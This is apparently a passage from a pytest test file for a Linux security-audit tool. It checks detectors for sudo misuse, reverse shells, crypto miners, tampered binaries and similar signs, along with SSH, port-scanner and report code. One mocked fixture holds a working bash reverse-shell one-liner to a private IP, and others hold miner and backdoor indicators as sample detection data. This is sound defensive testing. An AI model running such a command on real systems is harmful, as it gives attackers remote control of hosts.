        assert result.status == "warn"

    def test_command_failure_returns_pass(self):
        """Test graceful failure handling"""
        from linux_health.checks import check_suspicious_process_locations

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(1, "", "Command not found"))

        result = check_suspicious_process_locations(mock_ssh)
        assert result.status == "pass"


class TestCheckUnexpectedSudoUsage:
    """Tests for unexpected sudo usage detection"""

    def test_normal_sudoers_returns_pass(self):
        """Test with normal sudoers configuration"""
        from linux_health.checks import check_unexpected_sudo_usage

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "No sudoers.d files", ""),  # no special sudoers
                (0, "", ""),  # no suspicious sudo commands
            ]
        )

        result = check_unexpected_sudo_usage(mock_ssh)
        assert result.status == "pass"

    def test_nopasswd_sudoers_detected(self):
        """Test detection of NOPASSWD sudoers"""
        from linux_health.checks import check_unexpected_sudo_usage

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "ALL=(ALL) NOPASSWD: ALL", ""),  # dangerous NOPASSWD
                (0, "", ""),
            ]
        )

        result = check_unexpected_sudo_usage(mock_ssh)
        assert result.status == "warn"
        assert "NOPASSWD" in result.details or "no password" in result.details.lower()

    def test_suspicious_sudo_commands_detected(self):
        """Test detection of suspicious sudo commands"""
        from linux_health.checks import check_unexpected_sudo_usage

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "", ""),
                (0, "sudo COMMAND=/bin/bash", ""),  # bash via sudo
            ]
        )

        result = check_unexpected_sudo_usage(mock_ssh)
        assert result.status == "warn"


class TestCheckRecentlyCreatedAccounts:
    """Tests for recently created account detection"""

    def test_no_recent_accounts_returns_pass(self):
        """Test when no recent accounts exist"""
        from linux_health.checks import check_recently_created_accounts

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_recently_created_accounts(mock_ssh)
        assert result.status == "pass"

    def test_recent_account_detected(self):
        """Test detection of recently created account"""
        from datetime import datetime, timedelta

        from linux_health.checks import check_recently_created_accounts

        now = datetime.now()
        recent_date = now - timedelta(days=5)
        date_str = recent_date.strftime("%Y-%m-%d %H:%M:%S")

        mock_ssh = Mock()
        output = f"{date_str}.123456+00:00|backdoor_user"
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_recently_created_accounts(mock_ssh)
        assert result.status == "warn"
        assert "recently created" in result.item.lower()

    def test_old_account_returns_pass(self):
        """Test that old accounts return pass"""
        from datetime import datetime, timedelta

        from linux_health.checks import check_recently_created_accounts

        now = datetime.now()
        old_date = now - timedelta(days=90)
        date_str = old_date.strftime("%Y-%m-%d %H:%M:%S")

        mock_ssh = Mock()
        output = f"{date_str}.123456+00:00|olduser"
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_recently_created_accounts(mock_ssh)
        assert result.status == "pass"


class TestCheckSystemBinaryModifications:
    """Tests for system binary modification detection"""

    def test_no_modified_binaries_returns_pass(self):
        """Test when no binaries modified"""
        from linux_health.checks import check_system_binary_modifications

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_system_binary_modifications(mock_ssh)
        assert result.status == "pass"

    def test_modified_binary_detected(self):
        """Test detection of recently modified binary"""
        from linux_health.checks import check_system_binary_modifications

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "/bin/bash", ""))

        result = check_system_binary_modifications(mock_ssh)
        assert result.status == "warn"
        assert "binary" in result.item.lower() or "modified" in result.item.lower()

    def test_multiple_modified_binaries_detected(self):
        """Test detection of multiple modified binaries"""
        from linux_health.checks import check_system_binary_modifications

        mock_ssh = Mock()
        output = "/bin/bash\n/usr/bin/sudo\n/sbin/init"
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_system_binary_modifications(mock_ssh)
        assert result.status == "warn"
        assert "3" in result.details


class TestCheckFailedLoginSpike:
    """Tests for failed login spike detection"""

    def test_normal_failed_logins_returns_pass(self):
        """Test with normal number of failed logins"""
        from linux_health.checks import check_failed_login_spike

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "5", ""),  # 5 failed logins
                (0, "", ""),  # no IPs
            ]
        )

        result = check_failed_login_spike(mock_ssh)
        assert result.status == "pass"

    def test_high_failed_logins_returns_warn(self):
        """Test detection of high failed login count"""
        from linux_health.checks import check_failed_login_spike

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "50", ""),  # 50 failed logins
                (0, "192.168.1.100\n192.168.1.101", ""),  # attacking IPs
            ]
        )

        result = check_failed_login_spike(mock_ssh)
        assert result.status == "warn"
        assert "50" in result.details or "spike" in result.item.lower()

    def test_command_failure_returns_pass(self):
        """Test graceful handling of auth log unavailability"""
        from linux_health.checks import check_failed_login_spike

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(1, "", "Permission denied"))

        result = check_failed_login_spike(mock_ssh)
        assert result.status == "pass"


class TestSuspiciousNetworkConnections:
    """Tests for suspicious network connections check"""

    def test_no_external_connections_passes(self):
        """Test that no external connections passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "0", ""))

        result = check_suspicious_network_connections(mock_ssh)
        assert result.status == "pass"

    def test_many_external_connections_fails(self):
        """Test that many external connections fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "60", ""))

        result = check_suspicious_network_connections(mock_ssh)
        assert result.status == "fail"
        assert "60" in result.details


class TestHiddenFilesInSystemDirs:
    """Tests for hidden files in system directories check"""

    def test_no_hidden_files_passes(self):
        """Test that no hidden files passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "0", ""))

        result = check_hidden_files_in_system_dirs(mock_ssh)
        assert result.status == "pass"

    def test_many_hidden_files_fails(self):
        """Test that many hidden files fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[(0, "10", ""), (0, "/tmp/.backdoor\n/var/tmp/.malware", "")]
        )

        result = check_hidden_files_in_system_dirs(mock_ssh)
        assert result.status == "fail"


class TestKernelModuleIntegrity:
    """Tests for kernel module integrity check"""

    def test_normal_modules_passes(self):
        """Test that normal module count passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(side_effect=[(0, "50", ""), (0, "", "")])

        result = check_kernel_module_integrity(mock_ssh)
        assert result.status == "pass"

    def test_suspicious_modules_fails(self):
        """Test that suspicious modules fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(side_effect=[(0, "50", ""), (0, "evil_module", "")])

        result = check_kernel_module_integrity(mock_ssh)
        assert result.status == "fail"


class TestActiveReverseShells:
    """Tests for reverse shell detection"""

    def test_no_reverse_shells_passes(self):
        """Test that no reverse shells detected passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_active_reverse_shells(mock_ssh)
        assert result.status == "pass"

    def test_reverse_shell_detected_fails(self):
        """Test that detected reverse shell fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            return_value=(0, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "")
        )

        result = check_active_reverse_shells(mock_ssh)
        assert result.status == "fail"


class TestWeakPasswordPolicy:
    """Tests for weak password policy check"""

    def test_no_password_policy_fails(self):
        """Test that no password policy fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_weak_password_policy(mock_ssh)
        assert result.status == "fail"

    def test_password_policy_configured_passes(self):
        """Test that configured password policy passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "minlen = 12\ndcredit = -1", ""))

        result = check_weak_password_policy(mock_ssh)
        assert result.status == "pass"


class TestContainerEscapeIndicators:
    """Tests for container escape detection"""

    def test_not_in_container_passes(self):
        """Test that not being in container passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "none", ""),
                (0, "0", ""),
                (0, "restricted", ""),
                (0, "0", ""),
            ]
        )

        result = check_container_escape_indicators(mock_ssh)
        assert result.status == "pass"

    def test_privileged_container_fails(self):
        """Test that privileged container fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[(0, "docker", ""), (0, "0", ""), (0, "privileged", "")]
        )

        result = check_container_escape_indicators(mock_ssh)
        assert result.status == "fail"


class TestARPSpoofing:
    """Tests for ARP spoofing detection"""

    def test_no_duplicates_passes(self):
        """Test that no duplicate MACs passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(side_effect=[(0, "", ""), (0, "10", "")])

        result = check_arp_spoofing(mock_ssh)
        assert result.status == "pass"

    def test_duplicate_macs_fails(self):
        """Test that duplicate MACs fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "aa:bb:cc:dd:ee:ff", ""))

        result = check_arp_spoofing(mock_ssh)
        assert result.status == "fail"


class TestDNSTampering:
    """Tests for DNS tampering detection"""

    def test_normal_dns_passes(self):
        """Test that normal DNS configuration passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "8.8.8.8\n8.8.4.4", ""))

        result = check_dns_tampering(mock_ssh)
        assert result.status == "pass"

    def test_suspicious_dns_fails(self):
        """Test that suspicious DNS fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "0.0.0.0", ""))

        result = check_dns_tampering(mock_ssh)
        assert result.status == "fail"


class TestCryptoMiners:
    """Tests for cryptocurrency miner detection"""

    def test_no_miners_passes(self):
        """Test that no miners detected passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[(0, "", ""), (0, "", ""), (0, "25.5", "")]
        )

        result = check_crypto_miners(mock_ssh)
        assert result.status == "pass"

    def test_miner_process_fails(self):
        """Test that miner process detection fails"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "xmrig --donate-level 0", ""))

        result = check_crypto_miners(mock_ssh)
        assert result.status == "fail"


class TestFileIntegrityCriticalBinaries:
    """Tests for critical binary integrity"""

    def test_unmodified_binaries_passes(self):
        """Test that unmodified binaries pass"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[(0, "", ""), (0, "-rwxr-xr-x /bin/bash", "")]
        )

        result = check_file_integrity_critical_binaries(mock_ssh)
        assert result.status == "pass"

    def test_recently_modified_binaries_fails(self):
        """Test that recently modified binaries fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "/bin/bash\n/usr/bin/sudo", ""),
                (0, "-rwxr-xr-x /bin/bash", ""),
            ]
        )

        result = check_file_integrity_critical_binaries(mock_ssh)
        assert result.status == "fail"


class TestLogTampering:
    """Tests for log tampering detection"""

    def test_normal_logs_passes(self):
        """Test that normal log files pass"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(side_effect=[(0, "500", ""), (0, "1000", "")])

        result = check_log_tampering(mock_ssh)
        assert result.status == "pass"

    def test_empty_logs_fails(self):
        """Test that empty logs fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "0", ""))

        result = check_log_tampering(mock_ssh)
        assert result.status == "fail"


class TestPrivilegeEscalationVectors:
    """Tests for privilege escalation detection"""

    def test_no_vectors_passes(self):
        """Test that no escalation vectors passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "", ""),  # no NOPASSWD entries
                (0, "", ""),  # no dangerous capabilities
                (0, "protected", ""),  # /etc/passwd not writable
                (0, "sudo version 1.9.10p1", ""),  # safe sudo version
            ]
        )

        result = check_privilege_escalation_vectors(mock_ssh)
        assert result.status == "pass"

    def test_nopasswd_sudo_warns(self):
        """Test that NOPASSWD sudo warns"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "user ALL=(ALL) NOPASSWD: ALL", ""),
                (0, "", ""),
                (0, "protected", ""),
                (0, "Sudo version 1.9.10", ""),
            ]
        )

        result = check_privilege_escalation_vectors(mock_ssh)
        assert result.status in ["warn", "fail"]


class TestWorldWritableSystemFiles:
    """Tests for world-writable files check"""

    def test_no_writable_files_passes(self):
        """Test that no world-writable files passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_world_writable_system_files(mock_ssh)
        assert result.status == "pass"

    def test_writable_files_fails(self):
        """Test that world-writable files fail"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            return_value=(0, "/usr/bin/bad_file\n/etc/writable_config", "")
        )

        result = check_world_writable_system_files(mock_ssh)
        assert result.status == "fail"


class TestDeletedFileHandles:
    """Tests for deleted file handles check"""

    def test_no_deleted_handles_passes(self):
        """Test that no deleted file handles passes"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_deleted_file_handles(mock_ssh)
        assert result.status == "pass"

    def test_deleted_handles_warns(self):
        """Test that deleted file handles warn"""

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "suspicious 1234 /tmp/.deleted", ""))

        result = check_deleted_file_handles(mock_ssh)
        assert result.status == "warn"


class TestSSHSession:
    """Tests for SSH session wrapper"""

    def test_ssh_session_context_manager(self):
        """Test SSH session context manager protocol"""
        from unittest.mock import MagicMock, patch

        from linux_health.ssh_client import SSHSession

        with patch("linux_health.ssh_client.paramiko.SSHClient") as mock_client_class:
            mock_client = MagicMock()
            mock_client_class.return_value = mock_client

            with SSHSession("host", "user", "pass") as session:
                assert session._client is not None
                mock_client.connect.assert_called_once()

            mock_client.close.assert_called_once()

    def test_ssh_session_run_command(self):
        """Test running SSH commands"""
        from unittest.mock import MagicMock, patch

        from linux_health.ssh_client import SSHSession

        with patch("linux_health.ssh_client.paramiko.SSHClient") as mock_client_class:
            mock_client = MagicMock()
            mock_client_class.return_value = mock_client

            # Mock exec_command response
            mock_stdout = MagicMock()
            mock_stderr = MagicMock()
            mock_stdout.channel.recv_exit_status.return_value = 0
            mock_stdout.read.return_value = b"test output"
            mock_stderr.read.return_value = b""
            mock_client.exec_command.return_value = (
                MagicMock(),
                mock_stdout,
                mock_stderr,
            )

            session = SSHSession("host", "user", "pass")
            session.connect()
            exit_code, stdout, stderr = session.run("ls")

            assert exit_code == 0
            assert stdout == "test output"
            assert stderr == ""
            session.close()

    def test_ssh_session_run_not_connected_raises(self):
        """Test running command without connection raises error"""
        from linux_health.ssh_client import SSHSession

        session = SSHSession("host", "user", "pass")

        with pytest.raises(RuntimeError, match="not connected"):
            session.run("ls")

    def test_ssh_session_gateway_tunnel(self):
        """Bastion connections open a direct-tcpip channel first."""
        from unittest.mock import MagicMock, patch

        from linux_health.ssh_client import SSHSession

        with (
            patch("linux_health.ssh_client.paramiko.SSHClient") as mock_client_class,
            patch("linux_health.ssh_client.paramiko.Transport") as mock_transport_class,
        ):
            mock_client = MagicMock()
            mock_client_class.return_value = mock_client
            mock_transport = MagicMock()
            mock_transport_class.return_value = mock_transport
            channel = MagicMock()
            mock_transport.open_channel.return_value = channel

            session = SSHSession(
                "inner",
                "u",
                "p",
                gateway={
                    "hostname": "bastion",
                    "port": 2222,
                    "username": "b",
                    "password": "bp",
                },
            )
            session.connect()

            mock_transport_class.assert_called_once_with(("bastion", 2222))
            mock_transport.open_channel.assert_called_once_with(
                "direct-tcpip", ("inner", 22), ("127.0.0.1", 0)
            )
            _, kwargs = mock_client.connect.call_args
            assert kwargs["sock"] is channel
            assert kwargs["hostname"] == "inner"

            session.close()
            mock_client.close.assert_called_once()
            mock_transport.close.assert_called_once()

    def test_ssh_session_gateway_key_loader(self):
        """Gateway key loader tries RSA/Ed25519/ECDSA in order."""
        from unittest.mock import MagicMock, patch

        from linux_health.ssh_client import SSHSession

        session = SSHSession("h", "u", "p", gateway={"key_path": "/k"})
        with patch("linux_health.ssh_client.paramiko.RSAKey") as rsa:
            rsa.from_private_key_file.side_effect = ValueError("nope")
            with patch("linux_health.ssh_client.paramiko.Ed25519Key") as ed:
                ed.from_private_key_file.return_value = MagicMock()
                assert (
                    session._load_gateway_key() is ed.from_private_key_file.return_value
                )

    def test_ssh_session_gateway_bad_key_raises(self, tmp_path):
        """Unreadable gateway keys fail fast with a clear error."""
        from linux_health.ssh_client import SSHSession

        session = SSHSession("h", "u", "p", gateway={"key_path": "/nonexistent-key"})
        with pytest.raises(ValueError, match="unreadable gateway key"):
            session._load_gateway_key()

    def test_ssh_session_no_gateway_no_transport(self):
        """Direct connections never touch Transport."""
        from unittest.mock import MagicMock, patch

        from linux_health.ssh_client import SSHSession

        with (
            patch("linux_health.ssh_client.paramiko.SSHClient") as mock_client_class,
            patch("linux_health.ssh_client.paramiko.Transport") as mock_transport_class,
        ):
            mock_client_class.return_value = MagicMock()
            session = SSHSession("host", "user", "pass")
            session.connect()
            mock_transport_class.assert_not_called()
            _, kwargs = session._client.connect.call_args
            assert kwargs["sock"] is None

    def test_ssh_session_default_uses_reject_policy(self):
        """Test default host key policy is reject (fail closed)"""
        from unittest.mock import MagicMock, patch

        from linux_health.ssh_client import SSHSession
        from paramiko.client import RejectPolicy

        with patch("linux_health.ssh_client.paramiko.SSHClient") as mock_client_class:
            mock_client = MagicMock()
            mock_client_class.return_value = mock_client

            session = SSHSession("host", "user", "pass")
            assert session.strict_host_key_checking is True
            session.connect()

            policy_arg = mock_client.set_missing_host_key_policy.call_args[0][0]
            assert isinstance(policy_arg, RejectPolicy)
            mock_client.load_system_host_keys.assert_called_once_with()

    def test_ssh_session_explicit_opt_out_uses_auto_add(self):
        """--no-strict-host-key-checking restores the old auto-add policy."""
        from unittest.mock import MagicMock, patch

        from linux_health.ssh_client import SSHSession
        from paramiko.client import AutoAddPolicy

        with patch("linux_health.ssh_client.paramiko.SSHClient") as mock_client_class:
            mock_client = MagicMock()
            mock_client_class.return_value = mock_client

            session = SSHSession("host", "user", "pass", strict_host_key_checking=False)
            assert session.strict_host_key_checking is False
            session.connect()

            policy_arg = mock_client.set_missing_host_key_policy.call_args[0][0]
            assert isinstance(policy_arg, AutoAddPolicy)

    def test_ssh_session_strict_uses_reject_policy(self):
        """Test strict mode rejects unknown host keys (MITM protection)"""
        from unittest.mock import MagicMock, patch

        from linux_health.ssh_client import SSHSession
        from paramiko.client import RejectPolicy

        with patch("linux_health.ssh_client.paramiko.SSHClient") as mock_client_class:
            mock_client = MagicMock()
            mock_client_class.return_value = mock_client

            session = SSHSession("host", "user", "pass", strict_host_key_checking=True)
            session.connect()

            policy_arg = mock_client.set_missing_host_key_policy.call_args[0][0]
            assert isinstance(policy_arg, RejectPolicy)


class TestPortScanner:
    """Tests for port scanner functionality"""

    def test_scan_single_port_open(self):
        """Test scanning a single open port"""
        from unittest.mock import MagicMock, patch

        from linux_health.scanner import _scan_single

        with patch("linux_health.scanner.socket.socket") as mock_socket_class:
            mock_socket = MagicMock()
            mock_socket_class.return_value.__enter__.return_value = mock_socket
            mock_socket.connect.return_value = None

            result = _scan_single("127.0.0.1", 80, 1.0)

            assert result.port == 80
            assert result.open is True
            assert result.reason == "Connected"

    def test_scan_single_port_timeout(self):
        """Test scanning a port that times out"""
        import socket
        from unittest.mock import MagicMock, patch

        from linux_health.scanner import _scan_single

        with patch("linux_health.scanner.socket.socket") as mock_socket_class:
            mock_socket = MagicMock()
            mock_socket_class.return_value.__enter__.return_value = mock_socket
            mock_socket.connect.side_effect = socket.timeout()

            result = _scan_single("127.0.0.1", 999, 0.1)

            assert result.port == 999
            assert result.open is False
            assert result.reason == "timeout"

    def test_scan_single_port_connection_refused(self):
        """Test scanning a port with connection refused"""
        from unittest.mock import MagicMock, patch

        from linux_health.scanner import _scan_single

        with patch("linux_health.scanner.socket.socket") as mock_socket_class:
            mock_socket = MagicMock()
            mock_socket_class.return_value.__enter__.return_value = mock_socket
            mock_socket.connect.side_effect = OSError("Connection refused")

            result = _scan_single("127.0.0.1", 999, 0.1)

            assert result.port == 999
            assert result.open is False
            assert "Connection refused" in result.reason

    def test_scan_ports_deduplicates(self):
        """Test that port scanning deduplicates ports"""
        from unittest.mock import patch

        from linux_health.scanner import scan_ports

        with patch("linux_health.scanner._scan_single") as mock_scan:
            from linux_health.scanner import PortStatus

            mock_scan.return_value = PortStatus(port=80, open=True, reason="Connected")

            results = scan_ports("127.0.0.1", [80, 80, 80], timeout=0.1, max_workers=1)

            # Should only scan once despite 3 duplicate ports
            assert len(results) == 1
            assert results[0].port == 80

    def test_scan_ports_filters_invalid(self):
        """Test that invalid ports are filtered"""
        from unittest.mock import patch

        from linux_health.scanner import scan_ports

        with patch("linux_health.scanner._scan_single") as mock_scan:
            from linux_health.scanner import PortStatus

            mock_scan.return_value = PortStatus(port=80, open=True, reason="Connected")

            results = scan_ports("127.0.0.1", [80], timeout=0.1, max_workers=1)

            assert len(results) == 1

    def test_normalize_host_strips_brackets(self):
        """Bracketed IPv6 literals normalize for socket/SSH APIs"""
        from linux_health.scanner import normalize_host

        assert normalize_host("[::1]") == "::1"
        assert normalize_host("::1") == "::1"
        assert normalize_host("example.com") == "example.com"
        assert normalize_host("[example.com]") == "example.com"
        assert normalize_host("  [::1]  ") == "::1"
        assert normalize_host("") == ""
        assert normalize_host("127.0.0.1") == "127.0.0.1"

    def test_scan_ipv6_loopback_live(self):
        """Real dual-stack probe: open and closed ports on ::1."""
        import socket

        from linux_health.scanner import scan_ports

        try:
            listener = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            listener.bind(("::1", 0))
        except OSError:
            pytest.skip("IPv6 loopback unavailable")
        open_port = listener.getsockname()[1]
        with listener:
            listener.listen(1)
            results = scan_ports("[::1]", [open_port], timeout=2.0)
            assert len(results) == 1
            assert results[0].open is True
        closed = scan_ports("::1", [open_port], timeout=1.0)
        assert closed[0].open is False

    def test_ssh_session_strips_brackets(self):
        """SSH connections use the bare address for bracketed input."""
        from linux_health.ssh_client import SSHSession

        assert SSHSession("[::1]", "u", "pw").hostname == "::1"
        assert SSHSession("example.com", "u", "pw").hostname == "example.com"


class TestCLIFunctions:
    """Tests for CLI utility functions and argument parser"""

    def test_build_parser_creates_parser(self):
        """Test that build_parser creates valid argument parser"""
        from linux_health.cli import build_parser

        parser = build_parser()

        assert parser is not None
        assert parser.prog is not None

    def test_build_parser_required_args(self):
        """Test parser accepts required arguments"""
        from linux_health.cli import build_parser

        parser = build_parser()
        args = parser.parse_args(["host", "user", "pass"])

        assert args.hostname == "host"
        assert args.username == "user"
        assert args.password == "pass"

    def test_build_parser_optional_args(self):
        """Test parser accepts optional arguments"""
        from linux_health.cli import build_parser

        parser = build_parser()
        args = parser.parse_args(
            [
                "host",
                "user",
                "pass",
                "--port",
                "2222",
                "--timeout",
                "10.5",
                "--command-timeout",
                "120",
                "--format",
                "md",
                "--output",
                "report.md",
            ]
        )

        assert args.port == 2222
        assert args.timeout == 10.5
        assert args.command_timeout == 120
        assert args.format == "md"
        assert args.output == "report.md"

    def test_build_parser_flags(self):
        """Test parser boolean flags"""
        from linux_health.cli import build_parser

        parser = build_parser()
        args = parser.parse_args(
            [
                "host",
                "user",
                "pass",
                "--ask-password",
                "--enable-rootkit-scan",
                "--check-package-hygiene",
            ]
        )

        assert args.ask_password is True
        assert args.enable_rootkit_scan is True
        assert args.check_package_hygiene is True


class TestReportRendering:
    """Tests for report rendering functions"""

    def test_render_report_text_with_no_checks(self):
        """Test text report with no checks"""
        system = SystemInfo(
            hostname="test", kernel="5.15", os="Ubuntu", uptime="1 day", users="1"
        )

        report = render_report_text(system, [], [])

        assert "test" in report
        assert "Ubuntu" in report
        assert "Total Checks:  0" in report

    def test_render_report_markdown_with_checks(self):
        """Test markdown report with checks"""
        system = SystemInfo(
            hostname="test", kernel="5.15", os="Ubuntu", uptime="1 day", users="1"
        )
        check = CheckResult(
            item="Test Check",
            status="pass",
            details="All good",
            recommendation="Keep it up",
            category="Testing",
        )

        report = render_report(system, [check], [])

        assert "# Linux Host Health Report: test" in report
        assert "Test Check" in report
        assert "✅ PASS" in report

    def test_render_report_text_status_grouping(self):
        """Test that text report groups by status"""
        system = SystemInfo(
            hostname="test", kernel="5.15", os="Ubuntu", uptime="1 day", users="1"
        )
        checks = [
            CheckResult(
                category="Test",
                item="Check A",
                status="pass",
                details="OK",
                recommendation="None",
            ),
            CheckResult(
                category="Test",
                item="Check B",
                status="fail",
                details="Bad",
                recommendation="Fix it",
            ),
            CheckResult(
                category="Test",
                item="Check C",
                status="warn",
                details="Careful",
                recommendation="Review",
            ),
        ]

        report = render_report_text(system, checks, [])

        # Find positions of each check item (grouped by status)
        check_b_pos = report.find("Check B")  # fail status
        check_c_pos = report.find("Check C")  # warn status
        check_a_pos = report.find("Check A")  # pass status

        # Verify FAIL comes first, then WARN, then PASS
        assert check_b_pos < check_c_pos < check_a_pos

    def test_render_report_markdown_status_grouping(self):
        """Test that markdown report groups by status"""
        system = SystemInfo(
            hostname="test", kernel="5.15", os="Ubuntu", uptime="1 day", users="1"
        )
        checks = [
            CheckResult(
                category="Test",
                item="Check A",
                status="pass",
                details="OK",
                recommendation="None",
            ),
            CheckResult(
                category="Test",
                item="Check B",
                status="fail",
                details="Bad",
                recommendation="Fix it",
            ),
            CheckResult(
                category="Test",
                item="Check C",
                status="warn",
                details="Careful",
                recommendation="Review",
            ),
        ]

        report = render_report(system, checks, [])

        # Find positions of each check item (grouped by status)
        check_b_pos = report.find("Check B")  # fail status
        check_c_pos = report.find("Check C")  # warn status
        check_a_pos = report.find("Check A")  # pass status

        # Verify FAIL comes first, then WARN, then PASS
        assert check_b_pos < check_c_pos < check_a_pos


class TestCommandTimeout:
    """Tests for command timeout functionality"""

    def test_set_command_timeout(self):
        """Test setting command timeout"""
        from linux_health.checks import set_command_timeout

        set_command_timeout(120.0)

        # Can't directly check global but ensure no error
        assert True

    def test_set_command_timeout_minimum(self):
        """Test command timeout has minimum value"""
        from linux_health.checks import set_command_timeout

        # Should not raise, should clamp to minimum
        set_command_timeout(0.5)
        set_command_timeout(-10)

        assert True


class TestDetailedSecurityInfoCommands:
    """Tests for detailed security information collection commands"""

    def test_gather_suid_binaries(self):
        """Test gathering SUID binaries"""
        from linux_health.checks import gather_suid_binaries

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "/usr/bin/sudo\n/usr/bin/passwd", ""))

        result = gather_suid_binaries(mock_ssh)

        # Returns string containing SUID binaries
        assert isinstance(result, str)
        assert "/usr/bin/sudo" in result
        assert "/usr/bin/passwd" in result

    def test_gather_root_logins(self):
        """Test gathering root login attempts"""
        from linux_health.checks import gather_root_logins

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "root pts/0 192.168.1.1", ""))

        result = gather_root_logins(mock_ssh)

        assert "root pts/0" in result

    def test_gather_disk_usage_dirs(self):
        """Test gathering disk usage by directory"""
        from linux_health.checks import gather_disk_usage_dirs

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "1G /var/log\n500M /tmp", ""))

        result = gather_disk_usage_dirs(mock_ssh)

        assert "1G" in result or "/var/log" in result

    def test_gather_firewall_rules(self):
        """Test gathering firewall rules"""
        from linux_health.checks import gather_firewall_rules

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "ACCEPT all", ""))

        result = gather_firewall_rules(mock_ssh)

        assert "ACCEPT" in result or len(result) >= 0

    def test_gather_sudoers_info(self):
        """Test gathering sudoers information"""
        from linux_health.checks import gather_sudoers_info

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "user ALL=(ALL) ALL", ""))

        result = gather_sudoers_info(mock_ssh)

        assert "user" in result or "ALL" in result


class TestJSONOutput:
    """Tests for JSON output format"""

    def _base_system(self):
        return SystemInfo(
            hostname="testhost",
            kernel="5.15.0-58",
            os="Ubuntu 22.04",
            uptime="up 5 days",
            users="2",
        )

    def test_json_output_structure(self):
        """Test JSON output has required structure"""
        system = self._base_system()
        checks = [
            CheckResult(
                category="Storage",
                item="Disk usage",
                status="pass",
                details="45% used",
                recommendation="No action",
                test_id="STOR-6310",
            )
        ]
        ports = [PortStatus(port=22, open=True, reason="ssh")]

        json_output = render_report_json(system, checks, ports, None)
        report = json.loads(json_output)

        assert "scan_info" in report
        assert "system" in report
        assert "summary" in report
        assert "hardening_by_category" in report
        assert "checks" in report
        assert "ports" in report

    def test_json_output_scan_info(self):
        """Test scan_info section"""
        system = self._base_system()
        json_output = render_report_json(system, [], [], None)
        report = json.loads(json_output)

        assert report["scan_info"]["scanner"] == "Auditless"
        assert "generated_at" in report["scan_info"]
        assert "version" in report["scan_info"]

    def test_json_output_system_info(self):
        """Test system section"""
        system = self._base_system()
        json_output = render_report_json(system, [], [], None)
        report = json.loads(json_output)

        assert report["system"]["hostname"] == "testhost"
        assert report["system"]["os"] == "Ubuntu 22.04"
        assert report["system"]["kernel"] == "5.15.0-58"

    def test_json_output_summary_calculations(self):
        """Test summary statistics calculation"""
        system = self._base_system()
        checks = [
            CheckResult("Cat1", "Test1", "pass", "OK", "None", "T1"),
            CheckResult("Cat2", "Test2", "warn", "Warning", "Fix it", "T2"),
            CheckResult("Cat3", "Test3", "fail", "Failed", "Fix now", "T3"),
        ]
        json_output = render_report_json(system, checks, [], None)
        report = json.loads(json_output)

        assert report["summary"]["total_checks"] == 3
        assert report["summary"]["passed"] == 1
        assert report["summary"]["warned"] == 1
        assert report["summary"]["failed"] == 1
        assert 0 <= report["summary"]["hardening_index"] <= 100

    def test_json_output_checks_include_test_ids(self):
        """Test that checks include test IDs"""
        system = self._base_system()
        checks = [
            CheckResult("Storage", "Disk", "pass", "OK", "None", test_id="STOR-6310")
        ]
        json_output = render_report_json(system, checks, [], None)
        report = json.loads(json_output)

        assert len(report["checks"]) == 1
